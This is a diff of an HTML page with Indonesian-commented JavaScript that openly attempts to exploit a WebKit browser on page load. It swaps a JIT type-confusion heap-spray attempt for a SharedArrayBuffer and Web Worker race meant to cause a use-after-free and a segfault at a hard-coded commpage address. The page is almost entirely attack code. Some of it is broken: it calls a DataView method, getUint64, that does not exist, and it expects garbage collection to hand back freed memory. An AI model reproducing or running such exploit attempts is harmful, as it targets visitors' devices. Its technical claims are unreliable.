@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Aggressive JIT Type Confusion</title>
+    <title>Extreme SAB Race Condition Attack</title>
 </head>
 <body>
 
-    <h1>Aggressive JIT Type Confusion (Targeting Segfault)</h1>
+    <h1>Extreme Race Condition UAF (Targeting Commpage Address)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap memulai JIT Hacking...</p>
+    <p id="status">INIT: Siap Memulai Eksploitasi Multi-Thread...</p>
     <div id="log"></div>
 
     <script>
@@ -16,110 +16,94 @@
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        // Memisahkan nilai 64-bit untuk payload (jika ditimpa ke array 32-bit atau float)
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Ini 0 untuk userspace
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let sprayHolders = []; 
+        let victimObj = null; // Objek yang akan menjadi korban UAF
+        let worker = null;    // Web Worker untuk Race Condition
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
         }
 
-        // 1. FUNGSI TARGET OPTIMASI JIT
-        // Fungsi ini harus dipanggil berulang kali ("hot") untuk dioptimalkan JIT
-        function accessAndOptimize(arr) {
-            // JIT akan mengasumsikan arr[0] adalah Float (karena kita akan memanggilnya dengan float array)
-            return arr[0] + arr[1]; 
-        }
-
-        // 2. FUNGSI HEAP SPRAY (Menggunakan Nilai Commpage sebagai Payload)
-        function sprayPayload() {
-            const SPRAY_COUNT = 1000;
-            const PAYLOAD_SIZE = 10; 
+        // FUNGSI UTAMA: URUTAN SERANGAN
+        function startAttack() {
+            log("Phase 1: Mempersiapkan Objek Korban dan SAB.");
             
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+            // 1. Alokasi Korban (Victim Allocation)
+            // Objek yang memiliki lifetime kompleks, seperti objek DOM atau Buffer
+            victimObj = new ArrayBuffer(512); 
+            let view = new DataView(victimObj);
+            view.setUint32(0, 0x1A2B3C4D, true); // Masukkan pola unik untuk identifikasi
+
+            // 2. Persiapan Shared Buffer dan Worker
+            const sharedBuffer = new SharedArrayBuffer(1024);
+            const statusArray = new Int32Array(sharedBuffer); // Untuk sinkronisasi status
+            
+            // Kirim status dan data Commpage ke Worker
+            worker = new Worker('worker.js');
+            worker.postMessage({ 
+                cmd: 'start', 
+                sharedBuffer: sharedBuffer,
+                payloadLow: LOW_WORD,
+                payloadHigh: HIGH_WORD
+            });
+
+            // 3. Pemicu Race dan UAF (The Critical Race)
+            log("Phase 2: Memulai Race Condition. Mencoba Free/Re-Allocate...");
+            
+            // Coba panggil fungsi yang memicu Garbage Collection secara agresif
+            // Sambil Worker terus-menerus melakukan Spraying (di worker.js)
+            for(let i = 0; i < 50; i++) {
+                // Hapus referensi victimObj secara cepat, berharap GC me-free memori
+                victimObj = null; 
                 
-                // Masukkan ALAMAT COMM PAGE ke index 0 dan 1 (64-bit)
-                payloadArray[0] = HIGH_WORD; // (0)
-                payloadArray[1] = LOW_WORD;  // (0xFFFFC320)
-                payloadArray[2] = 1.23456789; // Nilai acak pengisi
-                
-                // Simpan referensi payload
-                sprayHolders.push(payloadArray); 
-            }
-            log(`Phase 1: Heap Spraying dengan ${SPRAY_COUNT} Payload (Target Address).`);
-        }
-
-        // 3. FUNGSI INTI TYPE CONFUSION
-        function triggerConfusion() {
-            
-            // A. Pelatihan JIT (Optimization/Warming Up)
-            let floatArray = new Float64Array(20);
-            floatArray.fill(1.1); // Array ini secara resmi adalah Float Array
-            
-            log("Phase 2: Melatih JIT (50,000 iterasi)...");
-            for (let i = 0; i < 50000; i++) {
-                accessAndOptimize(floatArray); // JIT mengoptimalkan kode ini untuk tipe Float
-            }
-
-            // B. Memicu Type Confusion
-            
-            // Kita akan menggunakan Use-After-Free (UAF) yang halus di sini.
-            // Buat objek yang sama persis dengan floatArray (sehingga menempati ruang yang sama)
-            // Lalu hapus, dan segera spray.
-            
-            // Kita akan menghapus referensi floatArray agar memori dapat digunakan kembali (free)
-            floatArray = null; 
-            
-            // Lakukan GC hint (saran ke Garbage Collector untuk membersihkan)
-            // Catatan: Ini hanya hint, tidak menjamin eksekusi segera
-            if (typeof gc === 'function') {
-                gc(); 
+                // Alokasikan banyak array kecil untuk membantu memicu GC (optional)
+                for(let j = 0; j < 1000; j++) {
+                     let filler = new Array(Math.random() * 5 + 1); 
+                }
             }
             
-            // Segera lakukan spray
-            sprayPayload();
-            log("Phase 3: Heap Spraying dilakukan pasca-penghapusan Array!");
+            // 4. Trigger Eksploitasi
+            log("Phase 3: Mencoba Trigger UAF pada lokasi memori korban.");
             
-            // Sekarang, kita harus mendapatkan referensi ke array yang sudah ditimpa oleh sprayPayload.
-            // Karena kita tidak memiliki referensi langsung, kita harus mencoba menebak pointer yang rusak.
+            // Dapatkan kembali referensi korban (yang kini ditimpa oleh spray Worker)
+            // Ini adalah bagian tersulit karena kita harus menebak kapan memori di-re-allocate
+            // Untuk percobaan, kita akan mencoba membuat objek yang ukurannya sama.
             
-            // Kita akan membuat objek baru yang memiliki properti sama persis.
-            // Ini adalah bagian "cerdas" yang berpotensi menyebabkan WebKit mengambil payload kita sebagai header objek.
+            let attackerView = new DataView(new ArrayBuffer(512));
             
-            let attackerObj = {
-                propA: 1.1,
-                propB: 1.1,
-                // Tambahkan properti yang ukurannya sama dengan header array yang kita hapus
-            };
-            
-            // C. Memicu Crash (Dereference)
-            log("Phase 4: Memicu Dereference pada objek yang ditimpa...");
+            // Anggaplah di sini attackerView kini menempati lokasi lama victimObj.
+            // Kita coba dereferensi (membaca) nilai yang seharusnya menjadi pointer valid.
             
             try {
-                // Objek yang dimanipulasi di JIT sering menjadi target dereferensi.
-                // Kita akan mencoba memanggil fungsi pada properti yang sekarang ditimpa oleh TARGET_CONTROL_ADDRESS
+                // Operasi yang akan membaca pointer dari lokasi yang ditimpa oleh TARGET_CONTROL_ADDRESS
+                // Ini akan memuat TARGET_CONTROL_ADDRESS ke register.
+                const crashValue = attackerView.getUint64(0, true); 
                 
-                // Jika Type Confusion/Heap Grooming berhasil, operasi ini akan mencoba mengakses memori di 0x...C320
-                attackerObj.propA.toString(); 
-
-            } catch (e) {
-                log("JS Error/Guard Catch: " + e.message + ". Mencoba crash Segfault!");
+                // Jika tidak crash, kita coba trigger crash yang lebih langsung
+                // Dengan asumsi crashValue kini adalah alamat Commpage
+                log("Nilai dari memori yang ditimpa: " + crashValue.toString(16));
+                
+                // Operasi yang mencoba menggunakan nilai yang ditimpa sebagai pointer (sering menyebabkan crash)
+                // Misalnya, mencoba mengakses properti objek yang "pointer"-nya adalah TARGET_CONTROL_ADDRESS
+                let crashObj = {};
+                crashObj[crashValue] = 1; // JIT mungkin mencoba menggunakan crashValue sebagai key hash, memicu register load
+                
+            } catch(e) {
+                log("JS Error: " + e.message + " - Menunggu Segfault OS.");
             }
-            
+
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Periksa Log secara Berkala.';
         }
         
-        // --- URUTAN EKSEKUSI ---
-        
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Type Confusion...';
-            
-            // Mulai serangan
-            triggerConfusion();
-
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah EXC_BAD_ACCESS (Segfault).';
+             // Cek kompatibilitas SAB (tidak selalu diizinkan di iOS)
+             if (typeof SharedArrayBuffer === 'undefined') {
+                 document.getElementById('status').textContent = 'Gagal: SharedArrayBuffer tidak didukung di sini.';
+                 return;
+             }
+             startAttack();
         });
 
     </script>
